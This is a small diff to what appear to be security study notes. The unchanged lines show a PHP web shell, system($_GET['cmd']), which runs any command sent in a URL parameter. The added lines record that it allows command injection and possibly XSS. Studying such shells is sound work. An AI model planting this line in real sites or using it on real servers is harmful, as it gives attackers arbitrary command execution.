@@ -12,3 +12,7 @@ hint("will exec the arg specified in the GET parameter \"cmd\"");
 <?php
     system($_GET["cmd"]);
  ?>
+
+## FInal :
+1.Command injection through cmd GET parameter . 
+2.If it shows the out then no input sanitization and XSS is possible. 
